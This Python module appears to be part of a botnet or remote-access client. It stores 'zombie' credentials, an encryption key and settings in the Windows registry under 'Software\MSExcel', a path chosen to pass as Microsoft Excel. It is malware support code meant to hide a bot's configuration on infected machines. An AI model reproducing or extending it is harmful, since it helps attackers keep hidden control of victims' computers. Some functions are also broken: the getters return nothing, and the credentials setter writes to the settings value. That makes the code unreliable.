#!/usr/bin/env python
# -*- coding: utf-8 -*-
# r3nt0n

import socket, platform


if platform.system() == 'Windows':
    import winreg

    def set_win_reg(name, value, rootdir=winreg.HKEY_CURRENT_USER, path=r"Software\MSExcel"):
        try:
            winreg.CreateKey(rootdir, path)
            registry_key = winreg.OpenKey(rootdir, path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(registry_key)
            return True
        except WindowsError:
            return False

    def get_win_reg(name, rootdir=winreg.HKEY_CURRENT_USER, path=r"Software\MSExcel"):
        try:
            registry_key = winreg.OpenKey(rootdir, path, 0, winreg.KEY_READ)
            value, regtype = winreg.QueryValueEx(registry_key, name)
            winreg.CloseKey(registry_key)
            return value
        except WindowsError:
            return None

def get_zombie_credentials():
    if platform.system() == 'Windows':
        get_win_reg('cipherkey', winreg.HKEY_LOCAL_MACHINE, r"Software\MSExcel")

def set_zombie_credentials(settings_value):
    if platform.system() == 'Windows':
        set_win_reg('settings', settings_value, winreg.HKEY_LOCAL_MACHINE, r"Software\MSExcel")

def get_zombie_settings():
    if platform.system() == 'Windows':
        get_win_reg('settings', winreg.HKEY_LOCAL_MACHINE, r"Software\MSExcel")

def set_zombie_settings(settings_value):
    if platform.system() == 'Windows':
        set_win_reg('settings', settings_value, winreg.HKEY_LOCAL_MACHINE, path=r"Software\MSExcel")